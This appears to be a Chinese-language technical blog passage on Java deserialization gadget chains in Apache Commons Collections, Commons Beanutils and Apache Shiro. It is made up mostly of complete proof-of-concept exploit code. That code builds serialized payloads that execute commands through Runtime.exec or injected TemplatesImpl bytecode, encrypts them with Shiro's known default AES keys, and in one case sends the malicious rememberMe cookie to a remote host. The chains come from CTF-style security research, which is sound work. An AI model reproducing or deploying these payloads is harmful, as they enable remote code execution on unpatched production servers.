DualTreeBidiMap, POC package CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import org.apache.commons.collections4.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC13_DualLinkedHashBidiMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}), new ConstantTransformer(1) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); LazyMap lazyMap = LazyMap.lazyMap(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"1\"); Map expMap = new HashMap(); expMap.put(\"2\", tiedMapEntry); DualLinkedHashBidiMap dualLinkedHashBidiMap = new DualLinkedHashBidiMap(); Field field1 = dualLinkedHashBidiMap.getClass().getSuperclass().getDeclaredField(\"normalMap\"); field1.setAccessible(true); field1.set(dualLinkedHashBidiMap, expMap); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(dualLinkedHashBidiMap); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } } CC14_Flat3Map tabby挖掘 match path=(m1:Method)-[:CALL*..1]->(sink:Method) where m1.NAME=~\"put\" and m1.IS_SERIALIZABLE=true and sink.NAME=\"equals\" return path 代替 hashtable 起到冲突作用, 3和4版本皆可(写法稍微有些不同) Flat3Map#readObject Flat3Map#put (2组数据key的hashCode相等后进入equals判断) Flat3Map#equals(key1) (前一组key为恶意的Map, 后一组为HashMap) AbstractMap#get(key) 触发恶意Map的get方法, 后续同CC7 POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.DefaultedMap; import org.apache.commons.collections.map.Flat3Map; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; import static util.Reflections.setFieldValue; public class CC14_Flat3Map { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap1 = new HashMap(); // Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); // /**冲突是测试后写好的,不能乱改*/ // lazyMap1.put(\"yy\", 1); Map defaultMap1 = DefaultedMap.decorate(innerMap1, chainedTransformer); /**冲突是测试后写好的,不能乱改*/ defaultMap1.put(\"yy\", 1); /*jdk1.7~jdk1.8*/ Map outerMap = new HashMap(); outerMap.put(\"zZ\", 1); Flat3Map flat3Map = new Flat3Map(); // flat3Map.put(lazyMap1, \"rce\"); flat3Map.put(defaultMap1, \"rce\"); setFieldValue(flat3Map, \"hash1\", 0); flat3Map.put(outerMap, \"ricky\"); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(flat3Map); objectoutputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); }catch(Exception e){ e.printStackTrace(); } } } CC15_CC4 with 3.2.1 源于一次比赛, 把一些CommonCollections 3.2.1下常用的 Transformer 给 ban 了 ConstantTransformer InvokeTransformer 从CC4下手了, 虽然是用于CommonsCollections 4.0 但是可以改造一下, ConstantTransformer#transform方法是直接返回传入的对象 public Object transform(Object input) { return iConstant; } 被 ban 以后尝试 TransformMap public Object transform(Object input) { return this.iMap.get(input); } 其实也很明显就是通过key值去取value, 测试了 hashMap#get 方法就可以实现, 所以可以通过建立 hashMap 把value赋值为我们需要的 TrAXFilter.class, 后面就是通过一种方式去触发 LazyMap.get 或 DefaultedMap.get 即可, 这里我才用了CC5(图方便偷懒), InvokeTransformer则是可以替换成 InstantiateTransformer, 因为新建 TrAXFilter 对象触发了这句 _transformer = (TransformerImpl) templates.newTransformer(); 然后就是 TransformerImpl 的恶意模板注入, 这样也就是将CC4变成了全版本通用同时摆脱了3.2.1两个常用的 Transformer POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.MapTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC15_InstantiateTransformer { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); Map hashMap = new HashMap(); hashMap.put(\"ricky\", TrAXFilter.class); Transformer[] fakeTransformers = new Transformer[] {/*new ConstantTransformer(1)*/}; Transformer mapTransformer = MapTransformer.getInstance(hashMap); Transformer[] transformers = new Transformer[]{ mapTransformer, new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); /** * BadAttributeValueException.readObject -> * TiedMapEntry.toString -> * TiedMapEntry.getValue -> * (this.map.get)LazyMap.get -> * ChainedTransformer.transform * */ TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); // setFieldValue(badAttributeValueExpException, \"val\", tiedMapEntry); //调用CC2写好的设置函数 // 单独设置 Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 setFieldValue(chainedTransformer, \"iTransformers\", transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(badAttributeValueExpException); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); ois.close(); } } CommonsCollectionsShiro 影响版本：Apache Shiro 特征判断：返回包中包含rememberMe=deleteMe字段 shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值>>>Base64解码>>>AES解密>>>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。 参考: https://y4er.com/post/shiro-rememberme-rce/ AES加密的流程主要在 org.apache.shiro.mgt.AbstractRememberMeManage中 public abstract class AbstractRememberMeManager implements RememberMeManager { private static final Logger log = LoggerFactory.getLogger(AbstractRememberMeManager.class); // 密钥 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); // AES加密, 模式为CBC private Serializer serializer = new DefaultSerializer(); private CipherService cipherService = new AesCipherService(); private byte[] encryptionCipherKey; private byte[] decryptionCipherKey; ... // 加密流程 protected byte[] encrypt(byte[] serialized) { byte[] value = serialized; CipherService cipherService = this.getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey()); value = byteSource.getBytes(); } return value; } // 解密流程 protected byte[] decrypt(byte[] encrypted) { byte[] serialized = encrypted; CipherService cipherService = this.getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.decrypt(encrypted, this.getDecryptionCipherKey()); serialized = byteSource.getBytes(); } return serialized; } ... // 最后调用反序列化 protected PrincipalCollection deserialize(byte[] serializedIdentity) { return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity); } 反序列化方法在org.apache.shiro.io.DefaultSerializer中 public T deserialize(byte[] serialized) throws SerializationException { if (serialized == null) { String msg = \"argument cannot be null.\"; throw new IllegalArgumentException(msg); } else { ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try { ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); // 反序列化 T deserialized = ois.readObject(); ois.close(); return deserialized; } catch (Exception var6) { String msg = \"Unable to deserialze argument byte array.\"; throw new SerializationException(msg, var6); } } } 攻击过程如下： 使用CommonsCollections6_DefaultedMap利用链生成一个序列化Payload 使用Shiro默认Key进行加密 将密文作为rememberMe的Cookie发送给服务端 直接将其加密后生成的base64字符串放置RememberMe, 会出现如下报错 参考: https://blog.zsxsoft.com/post/35 https://www.anquanke.com/post/id/192619 主要原因为: 如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。 构建无数组 gadget 通过TiedMapEntry作为中继, 调用LazyMap/DefaultedMap的get方法, 其中TiedMapEntry中的key和value都可控, 而看一下LazyMap.get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { // 传入的key值可控, factory可控 Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 将构造好的TemplatesImpl（key）作为InvokerTransformer.transform函数的input传入，我们就可以将templates gadgets串起来了, 也就是通过InvokerTransformer.transform去调用TemplatesImpl.newTransformer从而触发字节码命令执行 POC import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollectionsShiro { public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); // Map outerMap = LazyMap.decorate(innerMap, transformer); Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, templates); Map expMap = new HashMap(); expMap.put(tiedmapentry, \"valuevalue\"); // 清除键值 outerMap.clear(); // 通过反射覆盖原本的iMethodName，防止序列化时在本地触发恶意方法 setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 加密调用 import javassist.ClassPool; import javassist.CtClass; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client { public static void main(String []args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode()); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); } } 触发效果如下 用CommonsCollections10也是可以的 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections10 { public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); // Map outerMap = LazyMap.decorate(innerMap, transformer); Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedMapEntry1 = new TiedMapEntry(outerMap, templates); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(\"keykey\", 1); // 获取hashtable的table类属性 Field tableField = Hashtable.class.getDeclaredField(\"table\"); tableField.setAccessible(true); Object[] table = (Object[])tableField.get(hashtable); Object tiedMapEntry2 = table[0]; if(tiedMapEntry2 == null) tiedMapEntry2 = table[1]; // 获取Hashtable.Entry的key属性 Field keyField = tiedMapEntry2.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); // 将key属性给替换成构造好的TiedMapEntry实例 keyField.set(tiedMapEntry2, tiedMapEntry1); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // 字节调用写法 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hashtable); oos.close(); return barr.toByteArray(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC15改装构造 CC4中的InstantiateTransformer也可用于CommonsCollections 3.2.1, 高版本 _tfactory 需要自行添加, Shiro反序列化时不会自动补充, 也是源于一次比赛的构造 package CommonsBeanutils; import cn.hutool.http.HttpRequest; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import javax.xml.transform.Templates; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollectionsShiro2 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); Transformer faketransformer = new InvokerTransformer(\"getClass\", null, null); Transformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, faketransformer); // Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, TrAXFilter.class); Map expMap = new HashMap(); expMap.put(tiedmapentry, \"valuevalue\"); // 清除键值 outerMap.clear(); // 通过反射覆盖原本的factory，防止序列化时在本地触发恶意方法 setFieldValue(outerMap, \"factory\", transformer); // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); byte[] key = Base64.getDecoder().decode(\"7Bhs26ccN6i/0AT9GhZULF==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key); // System.out.println(ciphertext.toString()); String rem = ciphertext.toString(); // 测试 // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // ois.readObject(); // ois.close(); String url=\"http://eci-2zefymd8icss9keczft1.cloudeci1.ichunqiu.com:8888/ricky\"; HttpRequest httpRequest = HttpRequest.get(url).cookie(\"rememberMe=\"+rem); httpRequest.execute(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 需要添加的依赖 cn.hutool hutool-all 5.7.22 CommonsBeanutils JavaBean 如果一个类的读写方法符合以下这种命名规范： // 读方法: public Type getXyz() // 写方法: public void setXyz(Type value) 那么这种class被称为JavaBean 例如该Cat类就是一中JavaBean final public class Cat { private String name = \"catalina\"; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法 PropertyUtils.getProperty(new Cat(), \"name\"); commons-beanutils会自动找到name属性的getter方法，也就是 getName，然后调用，获得返回值。除此之外，PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, \"b.c\"); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用 commons-beanutils中有个BeanComparator, 符合CommonsCollections4中需要comparator触发的条件, 当其调用compare方法时, 跟进BeanComparator#compare() public int compare( Object o1, Object o2 ) { if ( property == null ) { // compare the actual objects return comparator.compare( o1, o2 ); } try { Object value1 = PropertyUtils.getProperty( o1, property ); Object value2 = PropertyUtils.getProperty( o2, property ); return comparator.compare( value1, value2 ); } catch ( IllegalAccessException iae ) { throw new RuntimeException( \"IllegalAccessException: \" + iae.toString() ); } catch ( InvocationTargetException ite ) { throw new RuntimeException( \"InvocationTargetException: \" + ite.toString() ); } catch ( NoSuchMethodException nsme ) { throw new RuntimeException( \"NoSuchMethodException: \" + nsme.toString() ); } } 假设o1是 TemplateImpl 实例, 而o2是 outputProperties , 则可以使用 PropertyUtils.getProperty 调用TemplatesImpl#getOutputProperties()从而触发代码执行, 其中 实例是由 PriorityQueue 传入的, 而 outputProperties 是 BeanComparator 中的属性 private String property; POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1 { public static void main(String[] args) throws Exception{ // 实例化一个BeanComparator对象 BeanComparator beanComparator = new BeanComparator(); setFieldValue(beanComparator, \"property\", \"outputProperties\"); // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = TemplatesImpl.class.newInstance(); // 通过反射设置字段的值为二维字节数组 setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); // 实例化PriorityQueue对象 PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // 通过add建立size为2的数组 priorityQueue.add(templates);priorityQueue.add(templates); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 无依赖Shiro反序列化 当Shiro脱离CommonsCollections时, 其本身还是可以进行反序列化, 而且依赖中仍存在 commons-banutils。 在没有commons-collections下使用BeanComparator去建立Shiro反序列化会发现如下的问题 commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。 我们可以跟进BeanComparator类会发现不包含ComparableComparator类 在 BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator。 public BeanComparator( String property ) { this( property, ComparableComparator.getInstance() ); } 既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件 实现 java.util.Comparator 接口 实现 java.io.Serializable 接口 Java、shiro或commons-beanutils自带，且兼容性强 可以找打继承Comparator方法的类 CaseInsensitiveComparator ReverseComparator AttarComparator CaseInsensitiveComparator 通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator public static final Comparator CASE_INSENSITIVE_ORDER = new CaseInsensitiveComparator(); private static class CaseInsensitiveComparator implements Comparator, java.io.Serializable { // use serialVersionUID from JDK 1.2.2 for interoperability private static final long serialVersionUID = 8575799808933029326L; public int compare(String s1, String s2) { int n1 = s1.length(); int n2 = s2.length(); int min = Math.min(n1, n2); for (int i = 0; i POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1 { public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // 实例化一个BeanComparator对象 final BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); // 实例化PriorityQueue对象 PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(\"1\");priorityQueue.add(\"2\"); /**换用继承会触发一些顺序上的问题*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 加密调用 package CommonsBeanutils; import javassist.ClassPool; import javassist.CtClass; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client1 { public static void main(String []args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); // byte[] payloads = new CommonsBeanutils1().getPayload(clazz.toBytecode()); byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode()); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); } } 触发效果 ReverseComparator 通过 Collections#reverseOrder() 即可拿到上下文中的 ReverseComparator 对象，用它来实例化 BeanComparator public static Comparator reverseOrder() { return (Comparator) ReverseComparator.REVERSE_ORDER; } /** * @serial include */ private static class ReverseComparator implements Comparator>, Serializable { private static final long serialVersionUID = 7207038068494060240L; static final ReverseComparator REVERSE_ORDER = new ReverseComparator(); public int compare(Comparable c1, Comparable c2) { return c2.compareTo(c1); } private Object readResolve() { return Collections.reverseOrder(); } @Override public Comparator> reversed() { return Comparator.naturalOrder(); } } 修改处 /**使用ReverseComparator类*/ final BeanComparator beanComparator = new BeanComparator(null, Collections.reverseOrder()); final BeanComparator beanComparator = new BeanComparator(null, Comparator.reverseOrder().reversed()); final BeanComparator beanComparator = new BeanComparator(null, Comparator.naturalOrder().reversed()); AttrCompare PriorityQueue#add()处需要添加带参数且继承Attr接口的类 AttrNSImpl PSVIAttrNSImpl 